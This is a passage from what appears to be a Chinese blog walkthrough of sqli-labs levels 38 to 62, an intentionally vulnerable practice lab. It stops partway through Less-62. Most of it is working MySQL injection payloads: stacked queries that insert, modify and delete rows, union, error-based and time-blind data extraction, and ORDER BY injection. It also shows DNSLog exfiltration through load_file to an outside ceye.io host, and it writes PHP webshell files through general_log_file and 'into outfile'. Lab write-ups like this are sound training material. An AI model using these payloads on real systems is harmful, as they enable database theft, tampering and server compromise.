style="zoom:75%"><ul><li><p>经过测试，本题貌似并没有设置任何过滤，仅仅要爆出数据的话，可以说与 <a href="#Less-1">Less-1</a> 一模一样，使用相同 <kbd>payload</kbd> 即可爆出所有数据。不过作为堆叠注入，其最大的优势在于可以执行所有 SQL 语句。也就是利用分号将语句分隔，这样后台执行时就可以执行多条语句。查看源码可知，为了实现堆叠注入，执行 SQL 语句的函数换成了 <kbd>mysqli_multi_query()</kbd>。</p></li><li><p>所以此处尝试使用堆叠注入尝试对后台数据库进行增删改查操作。首先使用 <kbd>insert into</kbd> 语句插入数据，<kbd>payload</kbd> 如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27;;insert into users(id,username,password) values(1314,&#x27;myr&#x27;,&#x27;520&#x27;);</span><br></pre></td></tr></table></figure><p>接下来查询表中数据验证插入是否成功，由于一般程序仅会回显第一条语句的结果（包括本靶机），因此堆叠注入在这一块并没有那么好用，故此处使用联合注入来查询数据（也就是 <a href="#Less-1">Less-1</a> 的 <kbd>payload</kbd>），查询结果如下图，可以看到笔者插入的数据已经成功出现在数据库中。</p><img src="https://bu.dusays.com/2022/11/17/637646bedef29.webp" alt="" style="zoom:75%"><p>然后尝试使用 <kbd>update</kbd> 语句修改数据库中的数据，<kbd>payload</kbd> 如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27;;update users set username=&#x27;mtm&#x27; where id=1314;</span><br></pre></td></tr></table></figure><p>同理，删除数据则使用如下 <kbd>payload</kbd> 即可：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27;;delete from users where id=1;</span><br></pre></td></tr></table></figure></li><li><p>此外，<a target="_blank" rel="noopener" href="https://www.sqlsec.com/2020/05/sqlilabs.html#Less-38">国光师傅的博客</a> 在本题介绍了额外两个堆叠注入的有趣用法，笔者在此也复现一下：</p><ol><li><p>DNSLog 数据外带</p><p>DNSLog 实际上就是控制一个域名，将查询出的数据与该域名拼接成下一级域名，当访问时虽然大概率无法访问成功，但是访问记录会存在于日志中，因此只需获取访问记录便可在域名中发现数据。很有意思的玩法，只可惜此处需要在 Windows 平台上才能利用，因为这需要用到 Windows 上的 UNC 路径，其主要用于指定和映射网络驱动器。原理是利用 MySQL 的 <kbd>load_file()</kbd> 函数来沿着参数指定的路径读取数据，我们将改路径替换为 UNC 网络路径，程序便会访问这个地址，然后我们便可以获得数据。UNC 路径格式如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\\[服务器名]\[共享资源名称]</span><br></pre></td></tr></table></figure><p>于是按如下 <kbd>payload</kbd> 拼接数据并访问便可完成数据外带，笔者使用的 DNSLog 平台为 <a target="_blank" rel="noopener" href="http://ceye.io/">CEYE</a>，由于 DNSLog 存在长度限制，故此处逐行爆出数据。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27;;select load_file(concat(&#x27;\\\\&#x27;,(select hex(concat_ws(&#x27;%20 -%20 &#x27;,id,username,password)) from users limit 0,1),&#x27;.zyj4av.ceye.io\\h-t-m&#x27;));</span><br></pre></td></tr></table></figure><p>值得注意的是，因为 <kbd>\</kbd> 符号需要转义才能正常使用，所以 <kbd>payload</kbd> 才会出现一堆的 <kbd>\</kbd>。同时因为并不需要真正访问资源，所以共享资源名称处可以随意。此外还有 <kbd>hex()</kbd> 函数，由于域名中不能带有特殊字符，所以一般进行一次编码，获取数据时解码一下即可。</p></li><li><p>开启日志 Getshell</p><p>这个玩法就有点像文件上传了，通过修改日志的路径为可通过 URL 访问的位置上（也就是修改 <kbd>general_log_file</kbd> 变量），日志文件名则为可被解析执行的文件，例如 PHP 文件。使用如下 <kbd>payload</kbd> 即可修改，由于一般情况下日志功能并没有被开启，因此此处先将 <kbd>general_log</kbd> 设置为 <kbd>ON</kbd>。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27;;set global general_log = &quot;ON&quot;;set global general_log_file=&#x27;/var/www/html/muma.php&#x27;;</span><br></pre></td></tr></table></figure><p>然后在查询语句中包括 PHP 语句，日志也就变成了一个木马。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27;;select &lt;?php phpinfo();?&gt;;</span><br></pre></td></tr></table></figure><p>此时再访问对应位置的 <kbd>muma.php</kbd> 文件即可，不过由于文件由 MySQL 完成创建及访问，默认也是属于 MySQL 用户组，因此直接访问的话会报 <kbd>500</kbd> 错误。<psw>也就是说如果笔者一开始设置权限时将服务器与数据库默认值归在一个用户组的话就被自己 Getshell 了，有点子危险。</psw>当然为了测试效果笔者还是将该文件的其他用户权限设为了可读，实测可行。</p></li></ol></li></ul><h3 id="Less-39">Less-39</h3><div class="note default flat"><p>GET - Stacked Query Injection - Intiger based</p></div><p>变了个色号，从副标题看应该只是变了闭合方式。</p><img src="https://bu.dusays.com/2022/11/19/6378ed3d2fd67.webp" alt="" style="zoom:75%"><ul><li><p>实测确实与前一关基本一致，由回显报错信息可确认为数字型注入，因此将前一题对应的单引号去掉即可将一切 <kbd>payload</kbd> 应用于本题，如下为插入数据的 <kbd>payload</kbd>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1;insert into users(id,username,password) values(1314,&#x27;myr&#x27;,&#x27;520&#x27;);</span><br></pre></td></tr></table></figure></li></ul><h3 id="Less-40">Less-40</h3><div class="note default flat"><p>GET - BLIND based - String - Stacked</p></div><p>再次换个色号。</p><img src="https://bu.dusays.com/2022/11/19/6378ed3d3a906.webp" alt="" style="zoom:75%"><ul><li><p>依旧换汤不换……啊换了闭合符号,而且不再报错了，有以下 <kbd>payload</kbd> 可确认闭合符号为单引号加小括号。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27;)--+</span><br></pre></td></tr></table></figure><p>剩下的就与之前的一致了，这里留一个插入数据的 <kbd>payload</kbd>。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27;);insert into users(id,username,password) values(1314,&#x27;myr&#x27;,&#x27;520&#x27;);</span><br></pre></td></tr></table></figure></li></ul><h3 id="Less-41">Less-41</h3><div class="note default flat"><p>GET - BLIND based - Intiger - Stacked</p></div><p>哟，少见的粉。</p><img src="https://bu.dusays.com/2022/11/19/6378ed3d3facf.webp" alt="" style="zoom:75%"><ul><li><p>本题依旧仅修改了闭合符号并且，由如下 <kbd>payload</kbd> 可知没闭合符号了，数字型注入。没有多少特别的，此处不再赘述。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1--+</span><br></pre></td></tr></table></figure></li></ul><h3 id="Less-42">Less-42</h3><div class="note default flat"><p>POST - Error based - String - Stacked</p></div><p>回到了自 <a href="#Less-24">Less-24</a> 初登场后首次出现的登录页面。</p><img src="https://bu.dusays.com/2022/11/19/6378ed3d40505.webp" alt="" style="zoom:75%"><ul><li><p>经过测试，底部忘记密码与注册功能均无效，因此只能在登录框施展手脚。而用户名处则做了过滤，但是密码处则没有过滤，甚至还可以回显报错信息，根据报错信息可以判断闭合符号为单引号。所以在密码处输入如下万能密码即可成功登录：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; or 1#</span><br></pre></td></tr></table></figure><p>但是如图只能登录数据库中的第一个账户，毕竟后台是单次查询的永真式，所以用户名已经不起任何作用了。</p><img src="https://bu.dusays.com/2022/11/19/6378ed3d45925.webp" alt="" style="zoom:75%"></li><li><p>此外，由于回显的用户名也是来自于单次查询的结果，因此若通过联合注入在用户名处构造我们需要的数据，便可通过浏览器爆出来，<kbd>payload</kbd> 如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; union select 1,(select group_concat(concat_ws(&#x27;  -  &#x27;,id,username,password) separator &#x27;&lt;br&gt;&#x27;) from users),3#</span><br></pre></td></tr></table></figure></li><li><p>不过都能显示报错信息了，所以也可以使用报错注入来爆出数据，在密码一栏输入如下 <kbd>payload</kbd> 即可获得 <kbd>emails</kbd> 表中的第一栏数据。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and extractvalue(1,concat(&#x27;~ &#x27;,(select concat_ws(&#x27;  -  &#x27;,id,email_id) from emails limit 0,1),&#x27; ~&#x27;))#</span><br></pre></td></tr></table></figure></li><li><p>当然，既然是堆叠注入时代了，本题堆叠注入还是不在话下的，使用如下 <kbd>payload</kbd> 即可在数据库中插入数据。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;;insert into users(id,username,password) values(1314,&#x27;myr&#x27;,&#x27;520&#x27;);</span><br></pre></td></tr></table></figure></li></ul><h3 id="Less-43">Less-43</h3><div class="note default flat"><p>POST - Error based - String - Stacked with twist</p></div><p>换个色号继续来。</p><img src="https://bu.dusays.com/2022/11/19/6378ed3d45f71.webp" alt="" style="zoom:75%"><ul><li>实测本题与前一关几乎一致，通过报错信息可以看出闭合符号换成了单引号加小括号，仅此而已。此处不再赘述。</li></ul><h3 id="Less-44">Less-44</h3><div class="note default flat"><p>POST - Error based - String - Stacked - Blind</p></div><p>可能是换了个色号的。</p><img src="https://bu.dusays.com/2022/11/19/6378ed3d46d81.webp" alt="" style="zoom:75%"><ul><li>本题变化依旧不大，就是不再回显报错信息了，但是可以很容易确定闭合符号为单引号，因此此处不再赘述。</li></ul><h3 id="Less-45">Less-45</h3><div class="note default flat"><p>POST - Error based - String - Stacked - Blind</p></div><p>小变了一下色号，但是这次竟然副标题都不变了。</p><img src="https://bu.dusays.com/2022/11/19/6378ed3d476d7.webp" alt="" style="zoom:75%"><ul><li>同前一关一样，没有了报错信息，但依然可以很容易确定闭合符号为单引号加小括号，因此此处不再赘述。</li></ul><h3 id="Less-46">Less-46</h3><div class="note default flat"><p>GET - Error based - Numeric - ORDER BY CLAUSE</p></div><p>重大变化，POST 时代暂时过去了，界面也与以往的 GET 时代界面不同。</p><img src="https://bu.dusays.com/2022/11/19/6378ed3d4941f.webp" alt="" style="zoom:75%"><ul><li><p>本题要求提交 <kbd>sort</kbd> 数据，根据实测不难发现，此处提交字段名后便会回显按对应字段排序的结果集。通过在结尾增加 <kbd>desc</kbd> 或 <kbd>asc</kbd> 可帮助判断此处是否能注入。</p><img src="https://bu.dusays.com/2022/11/19/6378ed3dbed9b.webp" alt="" style="zoom:75%"><p>不难推测后台查询语句大概率如下：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> users <span class="keyword">ORDER</span> <span class="keyword">BY</span> [输入字段名];</span><br></pre></td></tr></table></figure></li><li><p>因此本题需要在 <kbd>order by</kbd> 之后完成注入，这就与之前都有些不同了，主要还是不能直接使用联合注入了。不过报错注入还是可以与往常一样，使用如下 <kbd>payload</kbd> 即可查出 <kbd>emails</kbd> 表的第一行数据。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?sort=1 and (select 1 from (select count(*),concat((select concat_ws(&#x27;%20 -%20 &#x27;,id,email_id) from emails limit 0,1),floor (rand(0)*2))x from users group by x)a)--+</span><br></pre></td></tr></table></figure></li><li><p>此处还可以使用 <kbd>procedure analyse</kbd> 参数来报错注入，值得注意的是该参数还可以用于 <kbd>limit</kbd> 运算符之后的注入，<kbd>payload</kbd> 如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?sort=1 procedure analyse(extractvalue(1,concat(&#x27;~ &#x27;,(select concat_ws(&#x27;  -  &#x27;,id,email_id) from emails limit 0,1),&#x27; ~&#x27;)))--+</span><br></pre></td></tr></table></figure><p>不过很可惜，笔者实测在 MySQL 5.6 及后续版本中，已经无法在 <kbd>analyse()</kbd> 内完成 <kbd>select</kbd> 操作了，使用函数来查查数据库版本啥的还是可以的。但是在 MySQL 8 以后已经彻底删除 <kbd>procedure analyse</kbd> 了，所以完全不能用了。不过在 MariaDB 中并没有跟进删除（笔者当前版本为 10.6.5），虽然也不能完成 <kbd>select</kbd> 操作。</p><img src="https://bu.dusays.com/2022/11/19/6378ed3dceb65.webp" alt="" style="zoom:75%"></li><li><p>当然本题也能使用盲注，但是笔者实测 <kbd>order by</kbd> 后直接加比较式并不能按预期排序，所以我们需要添加一个 <kbd>rand()</kbd> 函数，将比较结果作为该函数的参数，便会根据比较情况返回不同排序的结果集，布尔盲注与延时盲注的 <kbd>payload</kbd> 如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">// 布尔盲注</span><br><span class="line">?sort=rand(ascii(substr(database(),1,1))=78)</span><br><span class="line"></span><br><span class="line">// 延时盲注</span><br><span class="line">?sort=rand(if(ascii(substr(database(),1,1))&gt;78,1,sleep(5)))</span><br></pre></td></tr></table></figure></li><li><p>此处也依然可以使用 <kbd>into outfile</kbd> 将结果保存至指定文件中，使用如下 <kbd>payload</kbd> 即可将数据放入网站根目录，当然这是在笔者环境中 MySQL 对该目录有写权限的前提下。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?sort=id into outfile &quot;/var/www/html/data.txt&quot;</span><br></pre></td></tr></table></figure><p>数据写入完成后直接在浏览器中访问该文件即可，此方法在网页不回显或者不完全回显数据的情况下效果还是非常显著的。不过有意思的是，后面再加上 <kbd>lines terminated by</kbd> 便可以写入我们指定的内容了，当然也可以使用 <kbd>fields terminated by</kbd>，区别就是 <kbd>lines</kbd> 是在每行结束加上指定内容，而 <kbd>fields</kbd> 则是在每个字段后都加上。 值得注意的是添加的内容需要以十六进制序列形式传入，然后就可以写木马了！写入 <kbd>&#60;?php phpinfo(); ?&#62;</kbd> 的 <kbd>payload</kbd> 如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?sort=1 into outfile &quot;/var/www/html/muma.php&quot; lines terminated by 0x3c3f70687020706870696e666f28293b203f3e</span><br></pre></td></tr></table></figure></li></ul><h3 id="Less-47">Less-47</h3><div class="note default flat"><p>GET - Error based - String - ORDER BY CLAUSE</p></div><p>从副标题来看接下来还得继续几关的 ORDER BY.</p><img src="https://bu.dusays.com/2022/11/19/6378ed3dcaff7.webp" alt="" style="zoom:75%"><ul><li>程序依然会回显爆出信息，可以判断注入点加上了单引号作为闭合符号，这也是相较于前一关唯一的区别了，所以在 <kbd>payload</kbd> 相应位置添加单引号即可拿下本题，此处不再赘述。</li></ul><h3 id="Less-48">Less-48</h3><div class="note default flat"><p>GET - Error based - Blind - Numeric - ORDER BY CLAUSE</p></div><p>本题一打开就是 <a href="#Less-47">Less-47</a> 的 LOGO，应该是原作者放错了，这里小改一下，不然 <kbd>48</kbd> 的 LOGO 都没出场过太可怜了。</p><img src="https://bu.dusays.com/2022/11/19/6378ed3dce781.webp" alt="" style="zoom:75%"><ul><li>本题主要变动还是不再回显报错信息了，注入点依旧是数字型，所以无法使用报错注入，但是其他的 <kbd>payload</kbd> 均与 <a href="#Less-46">Less-46</a> 中一致，此处不再赘述。</li></ul><h3 id="Less-49">Less-49</h3><div class="note default flat"><p>GET - Error based - String - Blind - ORDER BY CLAUSE</p></div><p>本题依旧没换 LOGO，笔者还是让他露个脸。</p><img src="https://bu.dusays.com/2022/11/19/6378ed3dd2120.webp" alt="" style="zoom:75%"><ul><li>依然不回显报错信息，增加了单引号作为闭合符号，所以除了不能报错注入，其余均与 <a href="#Less-47">Less-47</a> 一致，此处不再赘述。</li></ul><h3 id="Less-50">Less-50</h3><div class="note default flat"><p>GET - Error based - ORDER BY CLAUSE - Numeric - Stacked Injection</p></div><p>开始加入堆叠注入内容。</p><img src="https://bu.dusays.com/2022/11/19/6378ed3dd6aa4.webp" alt="" style="zoom:75%"><ul><li>本题可以回显报错信息，为数字型注入，查看源码可知后台再次用上了 <kbd>mysqli_multi_query</kbd> 函数，因此可以完成堆叠注入，当然解题步骤还是可以参考 <a href="#Less-46">Less-46</a> 与 <a href="#Less-38">Less-38</a>，此处不再赘述。</li></ul><h3 id="Less-51">Less-51</h3><div class="note default flat"><p>GET - Error based - ORDER BY CLAUSE - String - Stacked Injection</p></div><p>换个色号继续来。</p><img src="https://bu.dusays.com/2022/11/19/6378ed3dd4c66.webp" alt="" style="zoom:75%"><ul><li>本题依旧可以回显报错信息，唯一的变化是增加了单引号作为闭合符号。相应修改 <kbd>payload</kbd> 即可，此处不再赘述。</li></ul><h3 id="Less-52">Less-52</h3><div class="note default flat"><p>GET - Blind based - ORDER BY CLAUSE - Numeric - Stacked Injection</p></div><p>再换个色号。</p><img src="https://bu.dusays.com/2022/11/19/6378ed3de01f5.webp" alt="" style="zoom:75%"><ul><li>本题取消了报错回显，注入点回到了数字型注入，所以除了不能报错注入以外其他还是老样子，此处不再赘述。</li></ul><h3 id="Less-53">Less-53</h3><div class="note default flat"><p>GET - Blind based - ORDER BY CLAUSE - String - Stacked Injection</p></div><p>堆叠注入最后一关了！</p><img src="https://bu.dusays.com/2022/11/19/6378ed3de12ab.webp" alt="" style="zoom:75%"><ul><li>本题依旧没有没有报错回显，注入点再次增加了单引号，此外再无变化，故不再赘述。</li></ul><h2 id="进阶挑战">进阶挑战</h2><h3 id="Less-54">Less-54</h3><div class="note default flat"><p>GET - challenge - Union - 10 queries allowed - Variation 1</p></div><p>最后一个板块了，一点进来就能感受到非常不同。上方提示我们通过 GET 方法提交变量 <kbd>id</kbd>，中间提示我们需要获取 <kbd>secret key</kbd> 的值，而该数据仅存在于数据库 <kbd>challenges</kbd> 中，共有十次机会，超过之后包括列名表名在内的所有数据都会被重置。有意思起来了。</p><img src="https://bu.dusays.com/2022/11/19/6378ed3dea1a8.webp" alt="" style="zoom:75%"><ul><li><p>十步获取数据，就以往的经验来说应该是够的，首先判断注入点的闭合符号，程序不回显报错信息，但是可以由以下 <kbd>payload</kbd> 可确定闭合符号为单引号。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27;--+</span><br></pre></td></tr></table></figure></li><li><p>接下来判断查询的字段数，由以下两个 <kbd>payload</kbd> 可确定有 <kbd>3</kbd> 个字段。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; order by 3--+</span><br><span class="line">?id=1&#x27; order by 4--+</span><br></pre></td></tr></table></figure></li><li><p>然后判断回显位，由以下 <kbd>payload</kbd> 可确定第二位作为用户名回显而第三位作为密码回显。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,2,3--+</span><br></pre></td></tr></table></figure></li><li><p>然后查询数据库中的唯一的一张表名，<kbd>payload</kbd> 如下，当前笔者的表名为 <kbd>QXUI9B6YM1</kbd>，由于每十次就会重置，因此如果后续不小心超了就只能重新查了。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,2,(select group_concat(table_name separator &#x27;&lt;br&gt;&#x27;) from information_schema.tables where table_schema=&#x27;challenges&#x27;)--+</span><br></pre></td></tr></table></figure></li><li><p>获得表名之后再继续查字段名，<kbd>payload</kbd> 如下，当前笔者的四个字段名分别为 <kbd>id</kbd>、<kbd>sessid</kbd>、<kbd>secret_4OH5</kbd>、<kbd>tryy</kbd>。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,2,(select group_concat(column_name separator &#x27;&lt;br&gt;&#x27;) from information_schema.columns where table_name=&#x27;QXUI9B6YM1&#x27;)--+</span><br></pre></td></tr></table></figure></li><li><p>接下来就直接一口气爆出整个表的数据，<kbd>payload</kbd> 如下，</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,2,(select group_concat(concat_ws(&#x27;%20 -%20 &#x27;,id,sessid,secret_4OH5,tryy) separator &#x27;&lt;br&gt;&#x27;) from QXUI9B6YM1)--+</span><br></pre></td></tr></table></figure><p>表中仅有一行数据，其中第三列也就是 <kbd>secret_XXXX</kbd> 的数据就是我们需要的 <kbd>secret key</kbd>。通关之后就会收到以下祝贺，祝贺一会儿就会消失，笔者完成了两次才截到。</p><img src="https://bu.dusays.com/2022/11/19/6378ed3d2d396.webp" alt="" style="zoom:75%"><p>值得注意的是，由于仅涉及表名、字段名及数据的重置变化，因此理论上限制可以压缩至三部，当然对于闭合符号、字段数以及回显位的判断可能需要重置几次。</p></li></ul><h3 id="Less-55">Less-55</h3><div class="note default flat"><p>GET - challenge - Union - 14 queries allowed - Variation 2</p></div><p>界面变化不大，主要提示本次可尝试次数为 <kbd>14</kbd>。</p><img src="https://bu.dusays.com/2022/11/21/637a56fa012cd.webp" alt="" style="zoom:75%"><ul><li><p>实测本题与前一关基本一致，由以下 <kbd>payload</kbd> 即可确定闭合符号为小括号。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1)--+</span><br></pre></td></tr></table></figure><p>闭合符号变了所以也就额外送了几次机会，不过这并不影响解题，修改前一关的 <kbd>payload</kbd> 的闭合符号即可，此处不再赘述。</p></li></ul><h3 id="Less-56">Less-56</h3><div class="note default flat"><p>GET - challenge - Union - 14 queries allowed - Variation 3</p></div><p>貌似又进入了换色号阶段，页面与前一关相比还是只换了个色号。</p><img src="https://bu.dusays.com/2022/11/21/637a56fa093e0.webp" alt="" style="zoom:75%"><ul><li><p>本题依旧与前述关卡基本一致，由以下 <kbd>payload</kbd> 可知闭合符号换成了单引号加小括号。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27;)--+</span><br></pre></td></tr></table></figure><p>除此之外并无改动，因此还是修改之前 <kbd>payload</kbd> 即可解题，此处不再赘述。</p></li></ul><h3 id="Less-57">Less-57</h3><div class="note default flat"><p>GET - challenge - Union - 14 queries allowed - Variation 4</p></div><p>换了个色号，继续来。</p><img src="https://bu.dusays.com/2022/11/21/637a58cc2f3a7.webp" alt="" style="zoom:75%"><ul><li><p>本题依旧与前述关卡基本一致，由以下 <kbd>payload</kbd> 可知闭合符号换成了单引号。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27;--+</span><br></pre></td></tr></table></figure><p>除此之外并无改动，因此还是修改之前 <kbd>payload</kbd> 即可解题，此处不再赘述。</p></li></ul><h3 id="Less-58">Less-58</h3><div class="note default flat"><p>GET - challenge - Double Query - 5 queries allowed - Variation 1</p></div><p>重大更新，限制次数低达 <kbd>5</kbd> 次！</p><img src="https://bu.dusays.com/2022/11/21/637a56fa14cd6.webp" alt="" style="zoom:75%"><ul><li><p>本以为本题与此前关卡一致，但是测试正常提交 <kbd>id</kbd> 时情况就不太对了，用户名与密码跟预期的不太一样了。</p><img src="https://bu.dusays.com/2022/11/21/637a56fa2610c.webp" alt="" style="zoom:75%"><p>当然将所以数据全部测试一遍是可以发现规律的，毕竟 <kbd>58</kbd> 关走过来这些数据都是老朋友了，此处简略一些，直接看源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$unames</span>=<span class="keyword">array</span>(<span class="string">&quot;Dumb&quot;</span>,<span class="string">&quot;Angelina&quot;</span>,<span class="string">&quot;Dummy&quot;</span>,<span class="string">&quot;secure&quot;</span>,<span class="string">&quot;stupid&quot;</span>,<span class="string">&quot;superman&quot;</span>,<span class="string">&quot;batman&quot;</span>,<span class="string">&quot;admin&quot;</span>,<span class="string">&quot;admin1&quot;</span>,<span class="string">&quot;admin2&quot;</span>,<span class="string">&quot;admin3&quot;</span>,<span class="string">&quot;dhakkan&quot;</span>,<span class="string">&quot;admin4&quot;</span>);</span><br><span class="line"><span class="variable">$pass</span> = array_reverse(<span class="variable">$unames</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;Your Login name : &#x27;</span>. <span class="variable">$unames</span>[<span class="variable">$row</span>[<span class="string">&#x27;id&#x27;</span>]];</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;Your Password : &#x27;</span> .<span class="variable">$pass</span>[<span class="variable">$row</span>[<span class="string">&#x27;id&#x27;</span>]];</span><br></pre></td></tr></table></figure><p>不难看出输出的用户名和密码都取自于内部定义的数组，并且逆序搭配起来输出，等于回显的数据与查询结果一点关系都没有。</p></li><li><p>因此联合注入是彻底靠不住了，不过上帝为你关上…（误），继续测试网页不难发现本题可以回显报错信息，因此报错注入还是可行的。首先一个反斜杠就能确认闭合符号为单引号，然后就能构造报错来爆出字段名了，<kbd>payload</kbd> 如下，由于此时已经是查询 <kbd>challenges</kbd> 数据库的内容了，所以构造报错语句就不能直接使用 <kbd>users</kbd> 表了，这里示范改成 <kbd>information_schema.tables</kbd>。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and (select 1 from (select count(*),concat((select table_name from information_schema.tables where table_schema=&#x27;challenges&#x27; limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)--+</span><br></pre></td></tr></table></figure></li><li><p>由上述 <kbd>payload</kbd> 可以查出笔者当前表名为 <kbd>N4JL95Q7I2</kbd>，随后使用如下 <kbd>payload</kbd> 即可查出关键字段名为 <kbd>secret_QX4R</kbd>。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and (select 1 from (select count(*),concat((select column_name from information_schema.columns where table_name=&#x27;N4JL95Q7I2&#x27; and table_schema=&#x27;challenges&#x27; limit 2,1),floor(rand(0)*2))x from information_schema.tables group by x)a)--+</span><br></pre></td></tr></table></figure></li><li><p>获得字段名之后就可以安心拿数据了，<kbd>payload</kbd> 如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and (select 1 from (select count(*),concat((select concat_ws(&#x27;  -  &#x27;,secret_QX4R,id) from N4JL95Q7I2 limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)--+</span><br></pre></td></tr></table></figure></li></ul><h3 id="Less-59">Less-59</h3><div class="note default flat"><p>GET - challenge - Double Query - 5 queries allowed - Variation 2</p></div><p>换了个色号。</p><img src="https://bu.dusays.com/2022/11/21/637a56fa14b38.webp" alt="" style="zoom:75%"><ul><li>本题与前一关基本一致，用户名密码不作参考但是可以回显报错信息，因此依然使用报错注入即可，通过反斜杠即可确认本题为数字型注入，删去前一关 <kbd>payload</kbd> 中的单引号即可完成本题，此处不再赘述。</li></ul><h3 id="Less-60">Less-60</h3><div class="note default flat"><p>GET - challenge - Double Query - 5 queries allowed - Variation 3</p></div><p>少见的颜色。</p><img src="https://bu.dusays.com/2022/11/21/637a56fa1973e.webp" alt="" style="zoom:75%"><ul><li>本题与此前关卡基本一致，区别在于闭合符号换成了双引号加小括号，修改此前的 <kbd>payload</kbd> 即可，此处不再赘述。</li></ul><h3 id="Less-61">Less-61</h3><div class="note default flat"><p>GET - challenge - Double Query - 5 queries allowed - Variation 4</p></div><p>再换个色号。</p><img src="https://bu.dusays.com/2022/11/21/637a56fa18fac.webp" alt="" style="zoom:75%"><ul><li>闭合符号又被换了，这次略复杂，单引号加两个小括号，不过直接反斜杠还是可以一把确认，其余均与此前一致，故此处不再赘述。</li></ul><h3 id="Less-62">Less-62</h3><div class="note default flat"><p>GET - challenge - Blind - 130 queries allowed - Variation 1</p></div><p>重大变化，限制次数变成了 <kbd>130</kbd> 次</p><img src="https://bu.dusays.com/2022/11/21/637a56fa21b23.webp" alt="" style="zoom:75%"><h4 id="手工注入-10">手工注入</h4><ul><li><p>整体来说基本与此前关卡一致，不过闭合符号变成了单引号加小括号，但是还有一个致命的问题在于，报错信息的回显被取消了，因此本题将需要盲注，难怪限制次数会变成 <kbd>130</kbd> 次。工程量有些大，此处留一个最终查询的 <kbd>payload</kbd> 作为示范，详细步骤可参考 <a href="#Less-8">Less-8</a>。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span 